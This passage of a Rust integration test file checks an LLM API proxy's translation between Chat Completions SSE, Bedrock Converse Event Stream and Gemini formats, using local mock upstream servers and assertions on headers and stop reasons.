    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = r#"{"id":"chatcmpl-redacted","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":"pong"},"finish_reason":"eos"}]}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "grok-eos.toml",
        &format!(
            r#"
schema_version = 1
id = "grok-eos"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat-completions",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"grok-4","stream":true,"messages":[{"role":"user","content":"ping"}]}"#;
    let req = format!(
        "POST /v1/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("text/event-stream"),
        "JSON completion must wrap as SSE, got: {resp}"
    );
    assert!(
        resp.contains(r#""finish_reason":"stop""#),
        "wrap must remap finish_reason eos to stop, got: {resp}"
    );
    assert!(
        !resp.contains(r#""finish_reason":"eos""#),
        "wrap must not leak finish_reason eos into SSE, got: {resp}"
    );
}

#[test]
fn proxy_converse_stream_sends_eventstream_accept() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let n = stream.read(&mut buf).unwrap_or(0);
        let req = String::from_utf8_lossy(&buf[..n]);
        assert!(
            req.contains("POST /model/amazon.nova-lite-v1:0/converse-stream"),
            "upstream path: {req}"
        );
        assert!(
            req.to_ascii_lowercase()
                .contains("accept: application/vnd.amazon.eventstream"),
            "converse-stream must set Event Stream Accept, got: {req}"
        );
        let body = r#"{"output":{"message":{"role":"assistant","content":[{"text":"hi"}]}}}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "bedrock-proxy.toml",
        &format!(
            r#"
schema_version = 1
id = "bedrock-proxy"
wire = "converse"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/model/{{model}}/converse"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"amazon.nova-lite-v1:0","stream":true,"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /v1/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("200") || resp.contains("hi"),
        "proxy should reach converse-stream, got: {resp}"
    );
}

#[test]
fn proxy_eventstream_content_type_uses_stream_mapper() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let payload = br#"{"delta":{"text":"hi"},"contentBlockIndex":0}"#;
        let body = wiremux::stream::encode_eventstream_message("contentBlockDelta", payload);
        let header = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/vnd.amazon.eventstream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
            body.len()
        );
        let _ = stream.write_all(header.as_bytes());
        let _ = stream.write_all(&body);
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "bedrock-eventstream.toml",
        &format!(
            r#"
schema_version = 1
id = "bedrock-eventstream"
wire = "converse"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/model/{{model}}/converse"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"amazon.nova-lite-v1:0","stream":true,"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /v1/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        !resp.contains("decode upstream body"),
        "eventstream must not be collected as a JSON body, got: {resp}"
    );
    assert!(
        resp.contains("text/event-stream"),
        "eventstream must go through the stream mapper, got: {resp}"
    );
    assert!(
        resp.contains("hi"),
        "stream mapper must remap Converse text delta, got: {resp}"
    );
}

#[test]
fn proxy_same_dialect_converse_keeps_eventstream_content_type() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let payload = br#"{"delta":{"text":"hi"},"contentBlockIndex":0}"#;
        let body = wiremux::stream::encode_eventstream_message("contentBlockDelta", payload);
        let header = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/vnd.amazon.eventstream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
            body.len()
        );
        let _ = stream.write_all(header.as_bytes());
        let _ = stream.write_all(&body);
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "bedrock-passthrough.toml",
        &format!(
            r#"
schema_version = 1
id = "bedrock-passthrough"
wire = "converse"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/model/{{model}}/converse"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "converse",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"modelId":"amazon.nova-lite-v1:0","messages":[{"role":"user","content":[{"text":"hi"}]}]}"#;
    let req = format!(
        "POST /model/amazon.nova-lite-v1:0/converse HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = Vec::new();
    let _ = client.read_to_end(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    let head = String::from_utf8_lossy(&resp);
    assert!(
        head.to_ascii_lowercase()
            .contains("content-type: application/vnd.amazon.eventstream"),
        "same-dialect Converse must keep Event Stream Content-Type, got: {head}"
    );
    assert!(
        !head.to_ascii_lowercase().contains("text/event-stream"),
        "same-dialect Converse must not rewrite Event Stream as SSE, got: {head}"
    );
}

#[test]
fn proxy_same_dialect_converse_stream_error_is_not_sse() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let header = concat!(
            "HTTP/1.1 200 OK\r\n",
            "Content-Type: application/vnd.amazon.eventstream\r\n",
            "Content-Length: 4096\r\n",
            "Connection: close\r\n",
            "\r\n",
            "d",
        );
        let _ = stream.write_all(header.as_bytes());
        let _ = stream.flush();
        let _ = stream.shutdown(std::net::Shutdown::Write);
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "bedrock-stream-err.toml",
        &format!(
            r#"
schema_version = 1
id = "bedrock-stream-err"
wire = "converse"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/model/{{model}}/converse"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "converse",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"modelId":"amazon.nova-lite-v1:0","messages":[{"role":"user","content":[{"text":"hi"}]}]}"#;
    let req = format!(
        "POST /model/amazon.nova-lite-v1:0/converse HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        !resp.contains("event: error"),
        "Event Stream passthrough must not inject SSE errors, got: {resp}"
    );
}

#[test]
fn proxy_dest_converse_remaps_chat_sse_as_eventstream() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = concat!(
            "data: {\"id\":\"1\",\"object\":\"chat.completion.chunk\",\"choices\":[{\"index\":0,\"delta\":{\"content\":\"hi\"}}]}\n\n",
            "data: {\"id\":\"1\",\"object\":\"chat.completion.chunk\",\"choices\":[{\"index\":0,\"delta\":{},\"finish_reason\":\"stop\"}]}\n\n",
            "data: [DONE]\n\n",
        );
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-to-converse-sse.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-to-converse-sse"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "converse",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"modelId":"amazon.nova-lite-v1:0","messages":[{"role":"user","content":[{"text":"hi"}]}]}"#;
    let req = format!(
        "POST /model/amazon.nova-lite-v1:0/converse-stream HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = Vec::new();
    let _ = client.read_to_end(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    let (head, body) = http_head_and_body(&resp);
    assert!(
        head.to_ascii_lowercase()
            .contains("content-type: application/vnd.amazon.eventstream"),
        "dest Converse remap must advertise Event Stream, got: {head}"
    );
    assert!(
        !head.to_ascii_lowercase().contains("text/event-stream"),
        "dest Converse remap must not advertise SSE, got: {head}"
    );
    let frames = eventstream_frames(&body);
    let payloads = eventstream_raw_payloads(&body);
    assert!(
        payloads.iter().any(|value| {
            value.get("contentBlockDelta").is_none()
                && value.pointer("/delta/text").and_then(|v| v.as_str()) == Some("hi")
        }),
        "dest Event Stream payload must be the AWS member struct, got: {payloads:?}"
    );
    assert!(
        frames.iter().any(|frame| {
            frame.event.as_deref() == Some("contentBlockDelta") && frame.data.contains("hi")
        }),
        "dest Event Stream must carry remapped text, got: {frames:?}"
    );
    assert!(
        frames
            .iter()
            .any(|frame| frame.event.as_deref() == Some("messageStop")),
        "dest Event Stream must finish with messageStop, got: {frames:?}"
    );
    assert!(
        payloads
            .iter()
            .any(|value| value == &serde_json::json!({"stopReason": "end_turn"})),
        "dest Event Stream messageStop raw payload must be {{\"stopReason\":\"end_turn\"}}, got: {payloads:?}"
    );
}

#[test]
fn proxy_dest_converse_remaps_chat_sse_text_then_tool_indexes() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = concat!(
            "data: {\"id\":\"1\",\"object\":\"chat.completion.chunk\",\"choices\":[{\"index\":0,\"delta\":{\"content\":\"hi\"}}]}\n\n",
            "data: {\"id\":\"1\",\"object\":\"chat.completion.chunk\",\"choices\":[{\"index\":0,\"delta\":{\"tool_calls\":[{\"index\":0,\"id\":\"call_1\",\"type\":\"function\",\"function\":{\"name\":\"lookup\",\"arguments\":\"\"}}]}}]}\n\n",
            "data: {\"id\":\"1\",\"object\":\"chat.completion.chunk\",\"choices\":[{\"index\":0,\"delta\":{\"tool_calls\":[{\"index\":0,\"function\":{\"arguments\":\"{\\\"q\\\":\\\"x\\\"}\"}}]}}]}\n\n",
            "data: {\"id\":\"1\",\"object\":\"chat.completion.chunk\",\"choices\":[{\"index\":0,\"delta\":{},\"finish_reason\":\"tool_calls\"}]}\n\n",
            "data: [DONE]\n\n",
        );
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-to-converse-sse-tool.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-to-converse-sse-tool"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "converse",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"modelId":"amazon.nova-lite-v1:0","messages":[{"role":"user","content":[{"text":"hi"}]}]}"#;
    let req = format!(
        "POST /model/amazon.nova-lite-v1:0/converse-stream HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = Vec::new();
    let _ = client.read_to_end(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    let (head, body) = http_head_and_body(&resp);
    assert!(
        head.to_ascii_lowercase()
            .contains("content-type: application/vnd.amazon.eventstream"),
        "dest Converse remap must advertise Event Stream, got: {head}"
    );
    let payloads = eventstream_raw_payloads(&body);
    assert!(
        payloads.iter().any(|value| {
            value.pointer("/delta/text").and_then(|v| v.as_str()) == Some("hi")
                && value
                    .get("contentBlockIndex")
                    .and_then(serde_json::Value::as_u64)
                    == Some(0)
        }),
        "text contentBlockDelta must use contentBlockIndex 0, got: {payloads:?}"
    );
    assert!(
        payloads.iter().any(|value| {
            value.pointer("/start/toolUse").is_some()
                && value
                    .get("contentBlockIndex")
                    .and_then(serde_json::Value::as_u64)
                    == Some(1)
        }),
        "tool contentBlockStart must use contentBlockIndex 1, got: {payloads:?}"
    );
    assert!(
        payloads
            .iter()
            .any(|value| value == &serde_json::json!({"stopReason": "tool_use"})),
        "dest Event Stream messageStop must be tool_use after Chat tool_calls, got: {payloads:?}"
    );
}

#[test]
fn proxy_dest_converse_wraps_json_completion_as_eventstream() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = r#"{"id":"1","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":"hi"},"finish_reason":"stop"}]}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-to-converse-json.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-to-converse-json"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "converse",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"modelId":"amazon.nova-lite-v1:0","messages":[{"role":"user","content":[{"text":"hi"}]}]}"#;
    let req = format!(
        "POST /model/amazon.nova-lite-v1:0/converse-stream HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = Vec::new();
    let _ = client.read_to_end(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    let (head, body) = http_head_and_body(&resp);
    assert!(
        head.to_ascii_lowercase()
            .contains("content-type: application/vnd.amazon.eventstream"),
        "dest Converse JSON wrap must advertise Event Stream, got: {head}"
    );
    assert!(
        !head.to_ascii_lowercase().contains("text/event-stream"),
        "dest Converse JSON wrap must not advertise SSE, got: {head}"
    );
    let frames = eventstream_frames(&body);
    let payloads = eventstream_raw_payloads(&body);
    assert!(
        payloads.iter().any(|value| {
            value.get("contentBlockDelta").is_none()
                && value.pointer("/delta/text").and_then(|v| v.as_str()) == Some("hi")
        }),
        "JSON wrap dest payload must be the AWS member struct, got: {payloads:?}"
    );
    assert!(
        frames.iter().any(|frame| {
            frame.event.as_deref() == Some("contentBlockDelta") && frame.data.contains("hi")
        }),
        "JSON wrap must dest-encode text as Event Stream, got: {frames:?}"
    );
}

#[test]
fn proxy_dest_converse_wraps_json_completion_with_signature_as_eventstream() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = r#"{"id":"1","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":"hi","reasoning_signature":"sig-1"},"finish_reason":"stop"}]}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-to-converse-json-sig.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-to-converse-json-sig"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "converse",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"modelId":"amazon.nova-lite-v1:0","messages":[{"role":"user","content":[{"text":"hi"}]}]}"#;
    let req = format!(
        "POST /model/amazon.nova-lite-v1:0/converse-stream HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = Vec::new();
    let _ = client.read_to_end(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    let (head, _body) = http_head_and_body(&resp);
    let head_lc = head.to_ascii_lowercase();
    assert!(
        head_lc.contains("content-type: application/vnd.amazon.eventstream"),
        "dest Converse JSON wrap with reasoning_signature must stay Event Stream, got: {head}"
    );
    assert!(
        !head_lc.contains("application/json"),
        "dest Converse JSON wrap must not fall through to unary JSON, got: {head}"
    );
}

#[test]
fn proxy_dest_converse_remaps_chat_sse_content_filter() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = concat!(
            "data: {\"id\":\"1\",\"object\":\"chat.completion.chunk\",\"choices\":[{\"index\":0,\"delta\":{\"content\":\"hi\"}}]}\n\n",
            "data: {\"id\":\"1\",\"object\":\"chat.completion.chunk\",\"choices\":[{\"index\":0,\"delta\":{},\"finish_reason\":\"content_filter\"}]}\n\n",
            "data: [DONE]\n\n",
        );
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-to-converse-sse-filter.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-to-converse-sse-filter"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "converse",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"modelId":"amazon.nova-lite-v1:0","messages":[{"role":"user","content":[{"text":"hi"}]}]}"#;
    let req = format!(
        "POST /model/amazon.nova-lite-v1:0/converse-stream HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = Vec::new();
    let _ = client.read_to_end(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    let (head, body) = http_head_and_body(&resp);
    assert!(
        head.to_ascii_lowercase()
            .contains("content-type: application/vnd.amazon.eventstream"),
        "dest Converse content_filter remap must advertise Event Stream, got: {head}"
    );
    let payloads = eventstream_raw_payloads(&body);
    assert!(
        payloads
            .iter()
            .any(|value| value == &serde_json::json!({"stopReason": "content_filtered"})),
        "Chat finish_reason content_filter must dest-encode as content_filtered, got: {payloads:?}"
    );
}

#[test]
fn proxy_dest_converse_unary_json_stays_json() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = r#"{"id":"1","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":"hi"},"finish_reason":"stop"}]}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-to-converse-unary.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-to-converse-unary"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "converse",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"modelId":"amazon.nova-lite-v1:0","messages":[{"role":"user","content":[{"text":"hi"}]}]}"#;
    let req = format!(
        "POST /model/amazon.nova-lite-v1:0/converse HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.to_ascii_lowercase().contains("application/json"),
        "unary dest Converse must stay JSON, got: {resp}"
    );
    assert!(
        !resp
            .to_ascii_lowercase()
            .contains("application/vnd.amazon.eventstream"),
        "unary dest Converse must not dest-encode Event Stream, got: {resp}"
    );
    assert!(
        resp.contains("hi"),
        "unary dest Converse must remap assistant text, got: {resp}"
    );
}

#[test]
fn proxy_dest_gemini_path_model_reaches_upstream() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let n = stream.read(&mut buf).unwrap_or(0);
        let req = String::from_utf8_lossy(&buf[..n]);
        assert!(
            req.contains("\"model\":\"gemini-2.5-flash\""),
            "dest Gemini path model must reach Chat upstream, got: {req}"
        );
        assert!(
            !req.contains("\"model\":\"\""),
            "dest Gemini must not send an empty model, got: {req}"
        );
        let body = r#"{"id":"1","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":"hi"},"finish_reason":"stop"}]}"#;
        let resp = format!(
